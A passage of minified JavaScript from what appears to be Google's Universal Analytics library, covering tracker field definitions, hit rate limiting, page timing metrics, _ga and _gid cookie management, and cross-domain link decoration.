                for (var e = 0; e < this.M.length; e++) {
                    var n = t.get(this.M[e]);
                    n && d(n) && n.call(I, t)
                }
            } catch (t) { } (e = t.get(te)) != _ && d(e) && (t.set(te, _, !0), setTimeout(e, 10))
        };
        var Rt = function () {
            return Math.round(2147483647 * Math.random())
        },
            It = function () {
                try {
                    var t = new Uint32Array(1);
                    return I.crypto.getRandomValues(t), 2147483647 & t[0]
                } catch (t) {
                    return Rt()
                }
            };

        function Lt(t) {
            var e = Mt(t, Ve);
            500 <= e && g(15);
            var n = $t(t, Qt);
            if ("transaction" != n && "item" != n) {
                n = Mt(t, ze);
                var r = (new Date).getTime(),
                    a = Mt(t, Be);
                if (0 == a && t.set(Be, r), 0 < (a = Math.round(2 * (r - a) / 1e3)) && (n = Math.min(n + a, 20), t.set(Be, r)), 0 >= n) throw "abort";
                t.set(ze, --n)
            }
            t.set(Ve, ++e)
        }
        var Pt = function () {
            this.data = new R
        };
        Pt.prototype.get = function (t) {
            var e = Bt(t),
                n = this.data.get(t);
            return e && null == n && (n = d(e.defaultValue) ? e.defaultValue() : e.defaultValue), e && e.Z ? e.Z(this, t, n) : n
        };
        var $t = function (t, e) {
            return null == (t = t.get(e)) ? "" : "" + t
        },
            Mt = function (t, e) {
                return null == (t = t.get(e)) || "" === t ? 0 : Number(t)
            };
        Pt.prototype.Z = function (t) {
            return (t = this.get(t)) && d(t) ? t : _
        }, Pt.prototype.set = function (t, e, n) {
            if (t)
                if ("object" == typeof t)
                    for (var r in t) t.hasOwnProperty(r) && Dt(this, r, t[r], n);
                else Dt(this, t, e, n)
        };
        var Dt = function (t, e, n, r) {
            if (null != n) switch (e) {
                case yn:
                    ca.test(n)
            }
            var a = Bt(e);
            a && a.o ? a.o(t, e, n, r) : t.data.set(e, n, r)
        },
            Gt = {
                hitPayload: 88,
                location: 89,
                referrer: 90,
                title: 91,
                buildHitTask: 93,
                sendHitTask: 94,
                displayFeaturesTask: 95,
                customTask: 97,
                cookieName: 98,
                cookieDomain: 99,
                cookiePath: 100,
                cookieExpires: 101,
                cookieUpdate: 102,
                cookieFlags: 103,
                storage: 104,
                _x_19: 105,
                transportUrl: 106,
                allowAdFeatures: 107,
                sampleRate: 108
            };

        function Ut(t, e) {
            var n = Gt[t];
            n && g(n), "displayFeaturesTask" === t && null == e && g(96), /.*Task$/.test(t) && g(92)
        }

        function qt(t, e) {
            if (t)
                if ("object" == typeof t)
                    for (var n in t) t.hasOwnProperty(n) && Ut(n, e);
                else Ut(t, e)
        }
        var Ft = new R,
            Ht = [],
            Vt = function (t, e, n, r, a) {
                this.name = t, this.F = e, this.Z = r, this.o = a, this.defaultValue = n
            },
            Bt = function (t) {
                var e = Ft.get(t);
                if (!e)
                    for (var n = 0; n < Ht.length; n++) {
                        var r = Ht[n],
                            a = r[0].exec(t);
                        if (a) {
                            e = r[1](a), Ft.set(e.name, e);
                            break
                        }
                    }
                return e
            },
            zt = function (t, e, n, r, a) {
                return t = new Vt(t, e, n, r, a), Ft.set(t.name, t), t.name
            },
            Kt = function (t, e) {
                Ht.push([new RegExp("^" + t + "$"), e])
            },
            Xt = function (t, e, n) {
                return zt(t, e, n, void 0, Wt)
            },
            Wt = function () { },
            Zt = Xt("apiVersion", "v"),
            Yt = Xt("clientVersion", "_v");
        zt("anonymizeIp", "aip");
        var Jt = zt("adSenseId", "a"),
            Qt = zt("hitType", "t"),
            te = zt("hitCallback"),
            ee = zt("hitPayload");
        zt("nonInteraction", "ni"), zt("currencyCode", "cu"), zt("dataSource", "ds");
        var ne = zt("useBeacon", void 0, !1),
            re = zt("transport");
        zt("sessionControl", "sc", ""), zt("sessionGroup", "sg"), zt("queueTime", "qt");
        var ae = zt("_s", "_s");
        zt("screenName", "cd");
        var ie = zt("location", "dl", ""),
            oe = zt("referrer", "dr"),
            se = zt("page", "dp", "");
        zt("hostname", "dh");
        var ce = zt("language", "ul"),
            ue = zt("encoding", "de");
        zt("title", "dt", (function () {
            return L.title || void 0
        })), Kt("contentGroup([0-9]+)", (function (t) {
            return new Vt(t[0], "cg" + t[1])
        }));
        var le = zt("screenColors", "sd"),
            ge = zt("screenResolution", "sr"),
            fe = zt("viewportSize", "vp"),
            he = zt("javaEnabled", "je"),
            de = zt("flashVersion", "fl");
        zt("campaignId", "ci"), zt("campaignName", "cn"), zt("campaignSource", "cs"), zt("campaignMedium", "cm"), zt("campaignKeyword", "ck"), zt("campaignContent", "cc");
        var pe = zt("eventCategory", "ec"),
            ve = zt("eventAction", "ea"),
            me = zt("eventLabel", "el"),
            we = zt("eventValue", "ev"),
            _e = zt("socialNetwork", "sn"),
            be = zt("socialAction", "sa"),
            ye = zt("socialTarget", "st"),
            ke = zt("l1", "plt"),
            xe = zt("l2", "pdt"),
            Te = zt("l3", "dns"),
            Oe = zt("l4", "rrt"),
            Se = zt("l5", "srt"),
            Ce = zt("l6", "tcp"),
            Ae = zt("l7", "dit"),
            Ee = zt("l8", "clt"),
            Ne = zt("l9", "_gst"),
            je = zt("l10", "_gbt"),
            Re = zt("l11", "_cst"),
            Ie = zt("l12", "_cbt"),
            Le = zt("timingCategory", "utc"),
            Pe = zt("timingVar", "utv"),
            $e = zt("timingLabel", "utl"),
            Me = zt("timingValue", "utt");
        zt("appName", "an"), zt("appVersion", "av", ""), zt("appId", "aid", ""), zt("appInstallerId", "aiid", ""), zt("exDescription", "exd"), zt("exFatal", "exf");
        var De = zt("expId", "xid"),
            Ge = zt("expVar", "xvar"),
            Ue = zt("exp", "exp"),
            qe = zt("_utma", "_utma"),
            Fe = zt("_utmz", "_utmz"),
            He = zt("_utmht", "_utmht"),
            Ve = zt("_hc", void 0, 0),
            Be = zt("_ti", void 0, 0),
            ze = zt("_to", void 0, 20);
        Kt("dimension([0-9]+)", (function (t) {
            return new Vt(t[0], "cd" + t[1])
        })), Kt("metric([0-9]+)", (function (t) {
            return new Vt(t[0], "cm" + t[1])
        })), zt("linkerParam", void 0, void 0, (function (t) {
            if (t.get(Ke)) return g(35), Ir.generate(Hr(t));
            var e = $t(t, mn),
                n = $t(t, $n) || "";
            return e = "_ga=2." + b(Mr(n + e, 0) + "." + n + "-" + e), (t = Vr(t)) ? (g(44), t = "&_gac=1." + b([Mr(t.qa, 0), t.timestamp, t.qa].join("."))) : t = "", e + t
        }), Wt);
        var Ke = Xt("_cd2l", void 0, !1),
            Xe = zt("usage", "_u"),
            We = zt("_um");
        zt("forceSSL", void 0, void 0, (function () {
            return u
        }), (function (t, e, n) {
            g(34), u = !!n
        }));
        var Ze = zt("_j1", "jid"),
            Ye = zt("_j2", "gjid");
        Kt("\\&(.*)", (function (t) {
            var e = new Vt(t[0], t[1]),
                n = function (t) {
                    var e;
                    return Ft.map((function (n, r) {
                        r.F == t && (e = r)
                    })), e && e.name
                }(t[0].substring(1));
            return n && (e.Z = function (t) {
                return t.get(n)
            }, e.o = function (t, e, r, a) {
                t.set(n, r, a)
            }, e.F = void 0), e
        }));
        var Je = Xt("_oot"),
            Qe = zt("previewTask"),
            tn = zt("checkProtocolTask"),
            en = zt("validationTask"),
            nn = zt("checkStorageTask"),
            rn = zt("historyImportTask"),
            an = zt("samplerTask"),
            on = zt("_rlt"),
            sn = zt("buildHitTask"),
            cn = zt("sendHitTask"),
            un = zt("ceTask"),
            ln = zt("devIdTask"),
            gn = zt("timingTask"),
            fn = zt("displayFeaturesTask"),
            hn = zt("customTask"),
            dn = zt("fpsCrossDomainTask"),
            pn = Xt("_cta"),
            vn = Xt("name"),
            mn = Xt("clientId", "cid"),
            wn = Xt("clientIdTime"),
            _n = Xt("storedClientId"),
            bn = zt("userId", "uid"),
            yn = Xt("trackingId", "tid"),
            kn = Xt("cookieName", void 0, "_ga"),
            xn = Xt("cookieDomain"),
            Tn = Xt("cookiePath", void 0, "/"),
            On = Xt("cookieExpires", void 0, 63072e3),
            Sn = Xt("cookieUpdate", void 0, !0),
            Cn = Xt("cookieFlags", void 0, ""),
            An = Xt("legacyCookieDomain"),
            En = Xt("legacyHistoryImport", void 0, !0),
            Nn = Xt("storage", void 0, "cookie"),
            jn = Xt("allowLinker", void 0, !1),
            Rn = Xt("allowAnchor", void 0, !0),
            In = Xt("sampleRate", "sf", 100),
            Ln = Xt("siteSpeedSampleRate", void 0, 1),
            Pn = Xt("alwaysSendReferrer", void 0, !1),
            $n = Xt("_gid", "_gid"),
            Mn = Xt("_gcn"),
            Dn = Xt("useAmpClientId"),
            Gn = Xt("_gclid"),
            Un = Xt("_gt"),
            qn = Xt("_ge", void 0, 7776e6),
            Fn = Xt("_gclsrc"),
            Hn = Xt("storeGac", void 0, !0),
            Vn = zt("_x_19"),
            Bn = zt("_fplc", "_fplc"),
            zn = Xt("_cs"),
            Kn = Xt("_useUp", void 0, !1),
            Xn = zt("up", "up"),
            Wn = zt("_tac", void 0, !1),
            Zn = Xt("_gbraid"),
            Yn = Xt("_gbt"),
            Jn = Xt("_gbe", void 0, 7776e6),
            Qn = zt("transportUrl"),
            tr = zt("_r", "_r"),
            er = zt("_slc", "_slc"),
            nr = zt("_dp"),
            rr = zt("_jt", void 0, "n"),
            ar = zt("allowAdFeatures", void 0, !0),
            ir = zt("allowAdPersonalizationSignals", void 0, !0);

        function or(t, e, n, r) {
            e[t] = function () {
                try {
                    return r && g(r), n.apply(this, arguments)
                } catch (e) {
                    throw mt("exc", t, e && e.name), e
                }
            }
        }
        var sr = function (t) {
            if ("cookie" == t.get(Nn)) return 0 < (t = U("FPLC")).length ? t[0] : void 0
        },
            cr = function (t) {
                var e;
                (e = $t(t, Vn) && t.get(Ke)) && (e = !((e = Ir.get(t.get(Rn))) && e._fplc)), e && !sr(t) && t.set(Bn, "0")
            },
            ur = function (t) {
                var e = {};
                if (lr(e) || gr(e)) {
                    var n = e[ke];
                    null == n || 1 / 0 == n || isNaN(n) || (0 < n ? (fr(e, Te), fr(e, Ce), fr(e, Se), fr(e, xe), fr(e, Oe), fr(e, Ae), fr(e, Ee), fr(e, Ne), fr(e, je), fr(e, Re), fr(e, Ie), $((function () {
                        t(e)
                    }), 10)) : y(I, "load", (function () {
                        ur(t)
                    }), !1))
                }
            },
            lr = function (t) {
                var e = I.performance || I.webkitPerformance;
                if (!(e = e && e.timing)) return !1;
                var n = e.navigationStart;
                return 0 != n && (t[ke] = e.loadEventStart - n, t[Te] = e.domainLookupEnd - e.domainLookupStart, t[Ce] = e.connectEnd - e.connectStart, t[Se] = e.responseStart - e.requestStart, t[xe] = e.responseEnd - e.responseStart, t[Oe] = e.fetchStart - n, t[Ae] = e.domInteractive - n, t[Ee] = e.domContentLoadedEventStart - n, t[Ne] = Ra.L - n, t[je] = Ra.ya - n, I.google_tag_manager && I.google_tag_manager._li && (e = I.google_tag_manager._li, t[Re] = e.cst, t[Ie] = e.cbt), !0)
            },
            gr = function (t) {
                if (I.top != I) return !1;
                var e = I.external,
                    n = e && e.onloadT;
                return e && !e.isValidLoadTime && (n = void 0), 2147483648 < n && (n = void 0), 0 < n && e.setPageReadyTime(), null != n && (t[ke] = n, !0)
            },
            fr = function (t, e) {
                var n = t[e];
                (isNaN(n) || 1 / 0 == n || 0 > n) && (t[e] = void 0)
            },
            hr = function (e) {
                return function (n) {
                    if ("pageview" == n.get(Qt) && !e.I) {
                        e.I = !0;
                        var r = function (e) {
                            var n = Math.min(Mt(e, Ln), 100);
                            return !(t($t(e, mn)) % 100 >= n)
                        }(n),
                            a = 0 < C($t(n, ie), "gclid").length,
                            i = 0 < C($t(n, ie), "wbraid").length;
                        (r || a || i) && ur((function (t) {
                            r && e.send("timing", t), (a || i) && e.send("adtiming", t)
                        }))
                    }
                }
            },
            dr = !1,
            pr = function (t) {
                if ("cookie" == $t(t, Nn)) {
                    if (t.get(Sn) || $t(t, _n) != $t(t, mn)) {
                        var e = 1e3 * Mt(t, On);
                        vr(t, mn, kn, e), t.data.set(_n, $t(t, mn))
                    }
                    if ((t.get(Sn) || mr(t) != $t(t, $n)) && vr(t, $n, Mn, 864e5), t.get(Hn)) {
                        if (e = $t(t, Gn)) {
                            var n = Math.min(Mt(t, qn), 1e3 * Mt(t, On));
                            n = 0 === n ? 0 : Math.min(n, 1e3 * Mt(t, Un) + n - (new Date).getTime()), t.data.set(qn, n);
                            var r = {},
                                a = $t(t, Un),
                                i = $t(t, Fn),
                                o = Sr($t(t, Tn)),
                                s = Tr($t(t, xn)),
                                c = $t(t, yn),
                                u = $t(t, Cn);
                            i && "aw.ds" != i ? r && (r.ua = !0) : (e = ["1", a, F(e)].join("."), 0 <= n && (r && (r.ta = !0), q("_gac_" + F(c), e, o, s, c, n, u))), Ar(r)
                        }
                    } else g(75);
                    t.get(Hn) && (e = $t(t, Zn)) && (n = 0 === (n = Math.min(Mt(t, Jn), 1e3 * Mt(t, On))) ? 0 : Math.min(n, 1e3 * Mt(t, Yn) + n - (new Date).getTime()), t.data.set(Jn, n), r = {}, u = $t(t, Yn), o = Sr($t(t, Tn)), s = Tr($t(t, xn)), c = $t(t, yn), t = $t(t, Cn), e = ["1", u, F(e)].join("."), 0 <= n && (r && (r.ta = !0), q("_gac_gb_" + F(c), e, o, s, c, n, t)), Er(r))
                }
            },
            vr = function (t, e, n, r) {
                var a = br(t, e);
                if (a) {
                    n = $t(t, n);
                    var i = Sr($t(t, Tn)),
                        o = Tr($t(t, xn)),
                        s = $t(t, Cn),
                        c = $t(t, yn);
                    if ("auto" != o) q(n, a, i, o, c, r, s) && (dr = !0);
                    else {
                        g(32);
                        for (var u = Or(), l = 0; l < u.length; l++)
                            if (o = u[l], t.data.set(xn, o), a = br(t, e), q(n, a, i, o, c, r, s)) return void (dr = !0);
                        t.data.set(xn, "auto")
                    }
                }
            },
            mr = function (t) {
                var e = U($t(t, Mn));
                return yr(t, e)
            },
            wr = function (t) {
                if ("cookie" == $t(t, Nn) && !dr && (pr(t), !dr)) throw "abort"
            },
            _r = function (t) {
                if (t.get(En)) {
                    var e = $t(t, xn),
                        n = $t(t, An) || A(),
                        r = Nr("__utma", n, e);
                    r && (g(19), t.set(He, (new Date).getTime(), !0), t.set(qe, r.R), (e = Nr("__utmz", n, e)) && r.hash == e.hash && t.set(Fe, e.R))
                }
            },
            br = function (t, e) {
                e = F($t(t, e));
                var n = Tr($t(t, xn)).split(".").length;
                return 1 < (t = Cr($t(t, Tn))) && (n += "-" + t), e ? ["GA1", n, e].join(".") : ""
            },
            yr = function (t, e) {
                return kr(e, $t(t, xn), $t(t, Tn))
            },
            kr = function (t, e, n) {
                if (!t || 1 > t.length) g(12);
                else {
                    for (var r = [], a = 0; a < t.length; a++) {
                        var i = t[a],
                            o = i.split("."),
                            s = o.shift();
                        ("GA1" == s || "1" == s) && 1 < o.length ? (1 == (i = o.shift().split("-")).length && (i[1] = "1"), i[0] *= 1, i[1] *= 1, o = {
                            H: i,
                            s: o.join(".")
                        }) : o = c.test(i) ? {
                            H: [0, 0],
                            s: i
                        } : void 0, o && r.push(o)
                    }
                    if (1 == r.length) return g(13), r[0].s;
                    if (0 != r.length) return g(14), 1 == (r = xr(r, Tr(e).split(".").length, 0)).length ? r[0].s : (1 < (r = xr(r, Cr(n), 1)).length && g(41), r[0] && r[0].s);
                    g(12)
                }
            },
            xr = function (t, e, n) {
                for (var r, a = [], i = [], o = 0; o < t.length; o++) {
                    var s = t[o];
                    s.H[n] == e ? a.push(s) : null == r || s.H[n] < r ? (i = [s], r = s.H[n]) : s.H[n] == r && i.push(s)
                }
                return 0 < a.length ? a : i
            },
            Tr = function (t) {
                return 0 == t.indexOf(".") ? t.substr(1) : t
            },
            Or = function () {
                var t = [],
                    e = A().split(".");
                if (4 == e.length) {
                    var n = e[e.length - 1];
                    if (parseInt(n, 10) == n) return ["none"]
                }
                for (n = e.length - 2; 0 <= n; n--) t.push(e.slice(n).join("."));
                return e = L.location.hostname, V.test(e) || H.test(e) || t.push("none"), t
            },
            Sr = function (t) {
                return t ? (1 < t.length && t.lastIndexOf("/") == t.length - 1 && (t = t.substr(0, t.length - 1)), 0 != t.indexOf("/") && (t = "/" + t), t) : "/"
            },
            Cr = function (t) {
                return "/" == (t = Sr(t)) ? 1 : t.split("/").length
            },
            Ar = function (t) {
                t.ta && g(77), t.na && g(74), t.pa && g(73), t.ua && g(69)
            },
            Er = function (t) {
                t.ta && g(85), t.na && g(86), t.pa && g(87)
            };

        function Nr(t, e, n) {
            "none" == e && (e = "");
            var r = [],
                a = U(t);
            t = "__utma" == t ? 6 : 2;
            for (var i = 0; i < a.length; i++) {
                var o = ("" + a[i]).split(".");
                o.length >= t && r.push({
                    hash: o[0],
                    R: a[i],
                    O: o
                })
            }
            if (0 != r.length) return 1 == r.length ? r[0] : jr(e, r) || jr(n, r) || jr(null, r) || r[0]
        }

        function jr(e, n) {
            if (null == e) var r = e = 1;
            else r = t(e), e = t(m(e, ".") ? e.substring(1) : "." + e);
            for (var a = 0; a < n.length; a++)
                if (n[a].hash == r || n[a].hash == e) return n[a]
        }
        var Rr = new RegExp(/^https?:\/\/([^\/:]+)/),
            Ir = I.google_tag_data.glBridge,
            Lr = RegExp("(.*)([?&#])(?:_ga=[^&#]*)(?:&?)(.*)"),
            Pr = RegExp("(.*)([?&#])(?:_gac=[^&#]*)(?:&?)(.*)");

        function $r(e, n) {
            var r = new Date,
                a = I.navigator,
                i = a.plugins || [];
            for (e = [e, a.userAgent, r.getTimezoneOffset(), r.getYear(), r.getDate(), r.getHours(), r.getMinutes() + n], n = 0; n < i.length; ++n) e.push(i[n].description);
            return t(e.join("."))
        }

        function Mr(e, n) {
            var r = new Date,
                a = I.navigator,
                i = r.getHours() + Math.floor((r.getMinutes() + n) / 60);
            return t([e, a.userAgent, a.language || "", r.getTimezoneOffset(), r.getYear(), r.getDate() + Math.floor(i / 24), (24 + i) % 24, (60 + r.getMinutes() + n) % 60].join("."))
        }
        var Dr = function (t) {
            g(48), this.target = t, this.T = !1
        };
        Dr.prototype.ca = function (t, e) {
            if (t) {
                if (this.target.get(Ke)) return Ir.decorate(Hr(this.target), t, e);
                if (t.tagName) {
                    if ("a" == t.tagName.toLowerCase()) return void (t.href && (t.href = Gr(this, t.href, e)));
                    if ("form" == t.tagName.toLowerCase()) return Ur(this, t)
                }
                if ("string" == typeof t) return Gr(this, t, e)
            }
        };
        var Gr = function (t, e, n) {
            var r = Lr.exec(e);
            r && 3 <= r.length && (e = r[1] + (r[3] ? r[2] + r[3] : "")), (r = Pr.exec(e)) && 3 <= r.length && (e = r[1] + (r[3] ? r[2] + r[3] : "")), t = t.target.get("linkerParam"), r = e.indexOf("?");
            var a = e.indexOf("#");
            return (e = (e = n ? e + (-1 == a ? "#" : "&") + t : -1 == a ? e + (-1 === r ? "?" : "&") + t : e.substring(0, a) + (-1 === r || r > a ? "?" : "&") + t + e.substring(a)).replace(/&+_ga=/, "&_ga=")).replace(RegExp("&+_gac="), "&_gac=")
        },
            Ur = function (t, e) {
                if (e && e.action)
                    if ("get" == e.method.toLowerCase()) {
                        t = t.target.get("linkerParam").split("&");
                        for (var n = 0; n < t.length; n++) {
                            var r = t[n].split("="),
                                a = r[1];
                            r = r[0];
                            for (var i = e.childNodes || [], o = !1, s = 0; s < i.length; s++)
                                if (i[s].name == r) {
                                    i[s].setAttribute("value", a), o = !0;
                                    break
                                } o || ((i = L.createElement("input")).setAttribute("type", "hidden"), i.setAttribute("name", r), i.setAttribute("value", a), e.appendChild(i))
                        }
                    } else "post" == e.method.toLowerCase() && (e.action = Gr(t, e.action))
            };

        function qr(t, e) {
            if (e == L.location.hostname) return !1;
            for (var n = 0; n < t.length; n++)
                if (t[n] instanceof RegExp) {
                    if (t[n].test(e)) return !0
                } else if (0 <= e.indexOf(t[n])) return !0;
            return !1
        }

        function Fr(t, e) {
            return e != $r(t, 0) && e != $r(t, -1) && e != $r(t, -2) && e != Mr(t, 0) && e != Mr(t, -1) && e != Mr(t, -2)
        }

        function Hr(t) {
            var e = Vr(t),
                n = {};
            return n._ga = t.get(mn), n._gid = t.get($n) || void 0, n._gac = e ? [e.qa, e.timestamp].join(".") : void 0, e = t.get(Bn), t = sr(t), n._fplc = e && "0" !== e ? e : t, n
        }

        function Vr(t) {
            function e(t) {
                return null == t || "" === t ? 0 : Number(t)
            }
            var n = t.get(Gn);
            if (n && t.get(Hn)) {
                var r = e(t.get(Un));
                if (!(1e3 * r + e(t.get(qn)) <= (new Date).getTime())) return {
                    timestamp: r,
                    qa: n
                };
                g(76)
            }
        }
        Dr.prototype.S = function (t, e, n) {
            function r(n) {
                try {
                    n = n || I.event;
                    t: {
                        var r = n.target || n.srcElement;
                        for (n = 100; r && 0 < n;) {
                            if (r.href && r.nodeName.match(/^a(?:rea)?$/i)) {
                                var i = r;
                                break t
                            }
                            r = r.parentNode, n--
                        }
                        i = {}
                    } ("http:" == i.protocol || "https:" == i.protocol) && qr(t, i.hostname || "") && i.href && (i.href = Gr(a, i.href, e))
                } catch (t) {
                    g(26)
                }
            }
            var a = this;
            this.target.get(Ke) ? Ir.auto((function () {
                return Hr(a.target)
            }), t, e ? "fragment" : "", n) : (this.T || (this.T = !0, y(L, "mousedown", r, !1), y(L, "keyup", r, !1)), n && y(L, "submit", (function (e) {
                if ((e = (e = e || I.event).target || e.srcElement) && e.action) {
                    var n = e.action.match(Rr);
                    n && qr(t, n[1]) && Ur(a, e)
                }
            })))
        }, Dr.prototype.$ = function (t) {
            if (t) {
                var e = this,
                    n = e.target.get(zn);
                void 0 !== n && Ir.passthrough((function () {
                    if (n("analytics_storage")) return {};
                    var t = {};
                    return t._ga = e.target.get(mn), t._up = "1", t
                }), 1, !0)
            }
        };
        var Br = /^(GTM|OPT)-[A-Z0-9]+$/,
            zr = /^G-[A-Z0-9]+$/,
            Kr = /;_gaexp=[^;]*/g,
            Xr = /;((__utma=)|([^;=]+=GAX?\d+\.))[^;]*/g,
            Wr = /^https?:\/\/[\w\-.]+\.google.com(:\d+)?\/optimize\/opt-launch\.html\?.*$/,
            Zr = function (t, e, n, r) {
                n = n || {};
                var a = 1;
                zr.test(e) && (a = 2);
                var i = {
                    id: e,
                    type: a,
                    B: n.dataLayer || "dataLayer",
                    G: !1
                },
                    o = void 0;
                return t.get("&gtm") == e && (i.G = !0), 1 === a ? (i.ia = !!t.get("anonymizeIp"), i.sync = r, "t0" != (e = String(t.get("name"))) && (i.target = e), G(String(t.get("trackingId"))) || (i.clientId = String(t.get(mn)), i.ka = Number(t.get(wn)), n = n.palindrome ? Xr : Kr, n = (n = L.cookie.replace(/^|(; +)/g, ";").match(n)) ? n.sort().join("").substring(1) : void 0, i.la = n, i.qa = C($t(t, ie), "gclid"))) : 2 === a && (i.context = "c", o = {
                    allow_google_signals: t.get(ar),
                    allow_ad_personalization_signals: t.get(ir)
                }),
                    function (t, e) {
                        var n = (new Date).getTime();
                        I[t.B] = I[t.B] || [], n = {
                            "gtm.start": n
                        }, t.sync || (n.event = "gtm.js"), I[t.B].push(n), 2 === t.type && function (e, n, r) {
                            I[t.B].push(arguments)
                        }("config", t.id, e)
                    }(i, o),
                    function (t) {
                        function e(t, e) {
                            e && (n += "&" + t + "=" + b(e))
                        }
                        var n = ct(t.type) + b(t.id);
                        return "dataLayer" != t.B && e("l", t.B), e("cx", t.context), e("t", t.target), e("cid", t.clientId), e("cidt", t.ka), e("gac", t.la), e("aip", t.ia), t.sync && e("m", "sync"), e("cycle", t.G), t.qa && e("gclid", t.qa), Wr.test(L.referrer) && e("cb", String(Rt())), n
                    }(i)
            },
            Yr = {},
            Jr = function (t, e) {
                e || (e = (e = $t(t, vn)) && "t0" != e ? ia.test(e) ? "_gat_" + F($t(t, yn)) : "_gat_" + F(e) : "_gat"), this.Y = e
            },
            Qr = function (t, e, n) {
                !1 === e.get(ar) || e.get(n) || ("1" == U(t.Y)[0] ? e.set(n, "", !0) : e.set(n, "" + Rt(), !0))
            },
            ta = function (t, e) {
                ea(e) && q(t.Y, "1", $t(e, Tn), $t(e, xn), $t(e, yn), 6e4, $t(e, Cn))
            },
            ea = function (t) {
                return !!t.get(Ze) && !1 !== t.get(ar)
            },
            na = function (t) {
                return !Yr[$t(t, yn)] && void 0 === t.get("&gtm") && void 0 === t.get(re) && void 0 === t.get(Qn) && void 0 === t.get(Vn)
            },
            ra = function (t, e) {
                var n = new R,
                    r = function (e) {
                        Bt(e).F && n.set(Bt(e).F, t.get(e))
                    };
                r(Zt), r(Yt), r(yn), r(mn), r(Ze), 1 == e && (r(bn), r(Ye), r($n)), !1 === t.get(ir) && n.set("npa", "1"), n.set(Bt(Xe).F, f(t));
                var a = "";
                return n.map((function (t, e) {
                    a += b(t) + "=", a += b("" + e) + "&"
                })), a += "z=" + Rt(), 1 == e ? a = "t=dc&aip=1&_r=3&" + a : 2 == e && (a = "t=sr&aip=1&_r=4&slf_rd=1&" + a), a
            },
            aa = function (t) {
                if (na(t)) return Yr[$t(t, yn)] = !0,
                    function (e) {
                        if (e && !Yr[e]) {
                            var n = Zr(t, e);
                            O(n), Yr[e] = !0
                        }
                    }
            },
            ia = /^gtm\d+$/,
            oa = function (t, n) {
                if (!(t = t.model).get("dcLoaded")) {
                    var r, a = new e(h(t));
                    a.set(29), t.set(We, a.C), (n = n || {})[kn] && (r = F(n[kn])),
                        function (t, e) {
                            var n = e.get(sn);
                            e.set(sn, (function (e) {
                                Qr(t, e, Ze), Qr(t, e, Ye);
                                var r = n(e);
                                return ta(t, e), r
                            }));
                            var r = e.get(cn);
                            e.set(cn, (function (t) {
                                var e = r(t);
                                if (ea(t)) {
                                    g(80);
                                    var n = {
                                        U: ra(t, 1),
                                        google: ra(t, 2),
                                        count: 0
                                    };
                                    gt("https://stats.g.doubleclick.net/j/collect", n.U, n), t.set(Ze, "", !0)
                                }
                                return e
                            }))
                        }(n = new Jr(t, r), t), t.set("dcLoaded", !0)
                }
            },
            sa = function (t) {
                if (!t.get("dcLoaded") && "cookie" == t.get(Nn)) {
                    var e = new Jr(t);
                    Qr(e, t, Ze), Qr(e, t, Ye), ta(e, t), e = ea(t);
                    var n = na(t);
                    e && t.set(tr, 1, !0), n && t.set(er, 1, !0), (e || n) && (t.set(rr, "d", !0), g(79), t.set(nr, {
                        U: ra(t, 1),
                        google: ra(t, 2),
                        V: aa(t),
                        count: 0
                    }, !0))
                }
            },
            ca = /^(UA|YT|MO|GP)-(\d+)-(\d+)$/,
            ua = function (t) {
                function e(e, n) {
                    r.model.data.set(e, n), t.hasOwnProperty(e) && Ut(e, n)
                }

                function n(t, e) {
                    r.model.data.set(t, e), r.filters.add(t)
                }
                var r = this;
                this.model = new Pt, this.filters = new bt, e(vn, t[vn]), e(yn, function (t) {
                    return t ? t.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : ""
                }(t[yn])), e(kn, t[kn]), e(xn, t[xn] || A()), e(Tn, t[Tn]), e(On, t[On]), e(Sn, t[Sn]), e(Cn, t[Cn]), e(An, t[An]), e(En, t[En]), e(jn, t[jn]), e(Rn, t[Rn]), e(In, t[In]), e(Ln, t[Ln]), e(Pn, t[Pn]), e(Nn, t[Nn]), e(bn, t[bn]), e(wn, t[wn]), e(Dn, t[Dn]), e(Hn, t[Hn]), e(Ke, t[Ke]), e(Vn, t[Vn]), e(Kn, t[Kn]), e(zn, t[zn]), e(Zt, 1), e(Yt, "j98"), n(pn, Nt), n(Je, kt), n(hn, _), n(Qe, Ct), n(tn, xt), n(en, Et), n(nn, wr), n(rn, _r), n(an, yt), n(on, Lt), n(un, St), n(ln, At), n(fn, sa), n(dn, cr), n(sn, Tt), n(cn, Ot), n(gn, hr(this)), pa(this.model), da(this.model, t[mn]), this.model.set(Jt, function () {
                    var t = I.gaGlobal = I.gaGlobal || {};
                    return t.hid = t.hid || Rt()
                }())
            };
        ua.prototype.get = function (t) {
            return this.model.get(t)
        }, ua.prototype.set = function (t, e) {
            this.model.set(t, e), qt(t, e)
        }, ua.prototype.send = function (t) {
            if (!(1 > arguments.length)) {
                if ("string" == typeof arguments[0]) var e = arguments[0],
                    n = [].slice.call(arguments, 1);
                else e = arguments[0] && arguments[0][Qt], n = arguments;
                e && ((n = N(va[e] || [], n))[Qt] = e, qt(n), this.model.set(n, void 0, !0), this.filters.D(this.model), this.model.data.m = {})
            }
        }, ua.prototype.ma = function (t, e) {
            var n = this;
            ka(t, n, e) || (Ta(t, (function () {
                ka(t, n, e)
            })), xa(String(n.get(vn)), t, void 0, e, !0))
        };
        var la, ga, fa, ha, da = function (t, e) {
            var n = $t(t, kn);
            if (t.data.set(Mn, "_ga" == n ? "_gid" : n + "_gid"), "cookie" == $t(t, Nn)) {
                if (dr = !1, n = U($t(t, kn)), !(n = yr(t, n))) {
                    n = $t(t, xn);
                    var r = $t(t, An) || A();
                    null != (n = Nr("__utma", r, n)) ? (g(10), n = n.O[1] + "." + n.O[2]) : n = void 0
                }
                if (n && (dr = !0), r = n && !t.get(Sn))
                    if (2 != (r = n.split(".")).length) r = !1;
                    else if (r = Number(r[1])) {
                        var a = Mt(t, On);
                        r = r + a < (new Date).getTime() / 1e3
                    } else r = !1;
                r && (n = void 0), n && (t.data.set(_n, n), t.data.set(mn, n), (n = mr(t)) && t.data.set($n, n)), t.get(Hn) && (n = t.get(Gn), r = t.get(Fn), !n || r && "aw.ds" != r) && (n = {}, r = (L ? B(n) : {})[$t(t, yn)], Ar(n), r && 0 != r.length && (n = r[0], t.data.set(Un, n.timestamp / 1e3), t.data.set(Gn, n.qa))), t.get(Hn) && (n = t.get(Zn), r = {}, a = (L ? B(r, "_gac_gb", !0) : {})[$t(t, yn)], Er(r), a && 0 != a.length && (a = (r = a[0]).qa, n && n !== a || (r.labels && r.labels.length && (a += "." + r.labels.join(".")), t.data.set(Yn, r.timestamp / 1e3), t.data.set(Zn, a))))
            }
